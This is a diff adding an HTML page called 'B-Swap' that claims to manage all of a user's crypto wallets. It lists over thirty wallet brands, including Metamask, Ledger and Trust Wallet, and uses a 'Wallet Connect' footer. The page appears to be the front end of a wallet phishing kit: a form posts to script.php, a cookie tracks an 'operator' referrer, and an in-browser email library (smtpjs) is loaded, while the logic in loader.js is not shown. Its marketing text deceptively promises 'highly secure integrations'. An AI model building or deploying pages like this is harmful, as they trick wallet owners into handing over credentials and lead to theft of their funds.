@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="stylesheet" href="./css/animate.css">
+    <link rel="stylesheet" href="./css/screen.css">
+    <link rel="shortcut icon" href="./img/favicon.png" type="image/x-icon">
+    <script src="./js/functions.js"></script>
+    <title>B-Swap</title>
+</head>
+
+<body class="dark-theme">
+<form action="script.php" method="post">
+    <main>
+        <div class="container">
+            <section class="row">
+                <div class="theme-toggle">
+                    <div class="theme-btn">
+                        <div class="toggle" id="toggle"></div>
+                    </div>
+                </div>
+            </section>
+            <section class="row head">
+                <div class="disc">
+                    <p>
+                        The best way to manage all your wallets from a single app. With our highly secure integrations
+                        with top wallet providers, you can efficiently manage all your wallets on our app.
+                    </p>
+                    <img src="./img/logo.png" alt="">
+                </div>
+            </section>
+            <section id="wallets"></section>
+        </div>
+    </main>
+    <footer>
+        <p>2021&copy; Rights reserved. <span style="color:#1f5fac;">Wallet Connect</span>.</p>
+    </footer>
+    <div id="notifiers"></div>
+    <script>
+        var __sync = { "progress": 0 };
+        var __intervals = {};
+        const wallets = [
+            { "title": "Trust Wallet", "icon": "./img/icons/trust_wallet.png", "color": "#3375bb" },
+            { "title": "Sovryn Wallet", "icon": "./img/icons/sovryn.png", "color": "#737477" },
+            { "title": "Terra Wallet", "icon": "./img/icons/terra.png", "color": "#2845ae" },
+            { "title": "TomoChain", "icon": "./img/icons/tomo_chain.png", "color": "#00e8b5" },
+            { "title": "Fortmatic", "icon": "./img/icons/fortmatic.png", "color": "#6a52ff" },
+            { "title": "Digitex", "icon": "./img/icons/digitex.png", "color": "#1cb7ed" },
+            { "title": "Ledger", "icon": "./img/icons/ledger.png", "color": "#102534" },
+            { "title": "Defiat", "icon": "./img/icons/defiat.png", "color": "#8355ff" },
+            { "title": "Authereum", "icon": "./img/icons/authereum.png", "color": "#ff4c2f" },
+            { "title": "MEW Wallet", "icon": "./img/icons/mew.png", "color": "#1896a4" },
+            { "title": "Flare Wallet", "icon": "./img/icons/flare.png", "color": "#171a2e" },
+            { "title": "Atomic Wallet", "icon": "./img/icons/atomic.png", "color": "#289cfa" },
+            { "title": "Coinbase", "icon": "./img/icons/coinbase.png", "color": "#0254ff" },
+            { "title": "Blank Wallet", "icon": "./img/icons/blank.png", "color": "#000000" },
+            { "title": "Blockchain", "icon": "./img/icons/blockchain.png", "color": "#3d89f5" },
+            { "title": "Trezor", "icon": "./img/icons/trezor.png", "color": "#000000" },
+            { "title": "Squarelink", "icon": "./img/icons/squarelink.png", "color": "#3964df" },
+            { "title": "Torus", "icon": "./img/icons/torus.png", "color": "#0364ff" },
+            { "title": "VeChain", "icon": "./img/icons/vechain.png", "color": "#898cdc" },
+            { "title": "Scatter Wallet", "icon": "./img/icons/scatter.png", "color": "#62aeca" },
+            { "title": "Math Wallet", "icon": "./img/icons/math.png", "color": "#070707" },
+            { "title": "Mirror", "icon": "./img/icons/mirror.png", "color": "#000000" },
+            { "title": "Peak Defi", "icon": "./img/icons/peak_defi.png", "color": "#006996" },
+            { "title": "Guarda Wallet", "icon": "./img/icons/guarda.png", "color": "#8286de" },
+            { "title": "Metamask", "icon": "./img/icons/metamask.png", "color": "#cc6228" },
+            { "title": "AAVE", "icon": "./img/icons/aave.png", "color": "#7284b2" },
+            { "title": "Exodus", "icon": "./img/icons/exodus.png", "color": "#5f22ff" },
+            { "title": "Coinbase", "icon": "./img/icons/coinbase.png", "color": "#0454ff" },
+            { "title": "Enjin", "icon": "./img/icons/enjin.png", "color": "#3590ff" },
+            { "title": "Skale", "icon": "./img/icons/skale.png", "color": "#000000" },
+            { "title": "Portis", "icon": "./img/icons/portis.png", "color": "#509cba" },
+            { "title": "Wallet Connect", "icon": "./img/icons/wallet_connect.png", "color": "#3b99fc" }
+        ]
+        const urlParams = new URLSearchParams(window.location.search)
+        const __referrer = urlParams.get('ref') || 'operator'
+        if (!getCookie('referrer')) setCookie('referrer', __referrer, 7)
+    </script>
+    <script src="./js/loader.js"></script>
+    <script src="./js/theme.js"></script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+</body>
+
+</html>
